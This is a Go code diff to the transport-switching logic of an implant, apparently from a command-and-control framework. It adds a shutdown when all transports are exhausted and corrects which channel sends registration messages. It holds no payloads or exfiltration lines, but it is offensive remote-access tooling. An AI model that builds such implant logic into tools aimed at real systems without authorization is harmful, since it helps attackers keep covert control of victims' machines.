@@ -113,6 +113,12 @@ func (c2s *channels) startTransports() (err error) {
 	c2s.selectNextTransport()
 
 	for {
+		// Always check if all transports haven't reach their max attempts.
+		// If yes return, this will shutdown the whole implant.
+		if c2s.transportsExhausted() {
+			break
+		}
+
 		// Attempt to start the channel
 		err = c2s.Active.Start()
 		if err != nil {
@@ -139,7 +145,8 @@ func (c2s *channels) startTransports() (err error) {
 		// {{if .Config.Debug}}
 		log.Printf("Transport started (%s)", c2s.Active.Transport().URI.String())
 		// {{end}}
-		return
+
+		return nil
 	}
 
 	return errors.New("Failed to start one of the available transports")
@@ -391,7 +398,7 @@ func (c2s *channels) Switch(ID string) (err error) {
 		// Send a transport registration marked failed, with updated stats.
 		// The failure is noticed because we sent the ID of the current
 		// transport instead of the one we were supposed to start successfully.
-		next.Send(next.RegisterSwitch(oldTransportID, c2s.transportStatistics()))
+		c2s.Active.Send(c2s.Active.RegisterSwitch(oldTransportID, c2s.transportStatistics()))
 		return
 	}
 
@@ -401,7 +408,7 @@ func (c2s *channels) Switch(ID string) (err error) {
 
 	// Now send the registration message corresponding
 	// to the Channel type, with transport statistics.
-	next.Send(next.Register(c2s.transportStatistics()))
+	next.Send(next.RegisterSwitch(oldTransportID, c2s.transportStatistics()))
 
 	// Now that everything is done, shutdown the old transport
 	err = c2s.Active.Close()
